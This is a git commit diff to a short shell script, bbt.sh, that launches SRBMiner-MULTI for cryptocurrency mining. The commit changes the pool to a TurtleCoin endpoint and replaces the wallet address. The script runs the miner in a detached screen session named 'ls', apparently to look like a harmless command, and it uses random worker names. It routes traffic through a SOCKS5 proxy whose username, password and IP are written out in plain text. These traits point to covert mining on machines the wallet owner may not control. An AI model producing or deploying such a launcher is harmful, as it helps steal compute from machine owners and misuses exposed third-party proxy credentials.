4a1ba1205a3917c74b71822698b3821a1086c081
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-21 08:35:07 +0100

    Update bbt.sh

--- bbt.sh
+++ bbt.sh
@@ -8,8 +8,8 @@
 #!/bin/sh
 reset
 screen -dmS ls
-POOL=stratum+tcp://pool.semipool.com:33314
-WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
+POOL=stratum+ssl://turtlecoin.herominers.com:10380
+WALLET=TRTLv3Z7AoRXMJAZUzD3Yn6bjv3RhhErn1sj3nnTV3bjaWvJp7J7m7rEorQzAEri3FK3qtXLP53Xf6tQuYD3MxQFTRwf1RiWRX7 
 PY=socks5://qwehsyfs:w1uyert4fs@78.46.89.24:45265
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-RAVZ)
 ./SRBMiner-MULTI  --argon2id_chukwa2 --pool $POOL --wallet $WALLET.$WORKER -p c=DOGE 
